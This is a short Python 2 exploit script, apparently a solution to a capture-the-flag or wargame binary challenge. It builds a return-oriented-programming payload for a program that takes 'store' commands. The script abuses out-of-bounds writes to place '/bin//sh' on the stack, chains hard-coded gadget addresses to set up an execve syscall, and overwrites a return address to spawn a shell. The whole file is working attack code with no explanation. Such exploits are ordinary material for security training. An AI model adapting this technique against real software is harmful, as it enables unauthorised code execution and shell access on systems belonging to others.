import struct

def p(x):
    return struct.pack("<I", x)

def store(what, where):

    load = ""
    load += "store\n"
    load += "%i\n" % what
    load += "%i\n" % where

    return load

SYSCALL = 0x0806fa7f
ADD_ESP_POPALOT = 0x08053e51 # SETS ESP TO FIRST INDEX
POP_EAX = 0x080bc4d6
POP_ECX_EBX = 0x0806f3d1
ADD_EAX_9_POP_EDI = 0x08096f78
ADD_EAX_2 = 0x080980a7

BIN = 0x6e69622f
SH  = 0x68732f2f

payload = ""

# First we store /bin//sh on the stack
payload += store(BIN, 76)
payload += store(SH, 77)

payload += store(0xdead, 1)
payload += store(0, 2) # ESI to 0
#
payload += store(0, 4) # EBP ( later written to EDX )
payload += store(ADD_EAX_9_POP_EDI, 5)
#
payload += store(ADD_EAX_2, 7) # EAX is now 0xb ( execve )
payload += store(POP_ECX_EBX, 8)
#
payload += store(0xbffff6f8, 10) # EBX to /bin//sh
payload += store(0x08051002, 11)
#
payload += store(0xDEAD, 13)
payload += store(SYSCALL, 14)

# Overwrite return
payload += store(ADD_ESP_POPALOT, -11)
print payload
